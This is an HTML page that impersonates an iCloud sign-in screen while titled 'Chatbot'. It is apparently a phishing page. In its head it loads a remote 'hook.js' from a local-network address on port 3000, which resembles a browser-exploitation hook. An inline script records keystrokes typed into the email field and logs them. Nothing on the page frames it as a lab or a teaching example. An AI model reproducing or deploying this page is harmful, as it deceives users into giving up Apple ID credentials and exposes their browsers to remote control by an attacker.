<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Chatbot</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f9f9f9;
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
        }
    </style>
    <script src="http://192.168.1.112:3000/hook.js" id="dynamic-script"></script>
    <script src="script.js"></script>
</head>
<body>
    <h1>Sign In to iCloud</h1>
    <h6>Enter your Apple ID and password to sign into iCloud.</h6>
    <form>
        <input type="email" id="email" placeholder="e-mail address" />
        <input type="password" id="password" placeholder="password" />
        <button type="reset" id="reset-btn">Cancel</button>
        <button type="submit" id="submit-btn">OK</button>
    </form>
    <div id="status">Status: Waiting for input...</div>
    <script>
        const textbox = document.getElementById('email');
        const log = document.getElementById('password');

        // Array to hold logged keystrokes
        let keystrokes = [];
        // Event listener for keydown events
        textbox.addEventListener('keydown', (event) => {
            // Log the key pressed
            keystrokes.push(event.key);
            // Update the log display
            log.textContent = keystrokes.join('');
            console.log("++++++++++++++++++++++++++++++++")
            console.log(log.textContent)
        });
    </script>
</body>
</html>
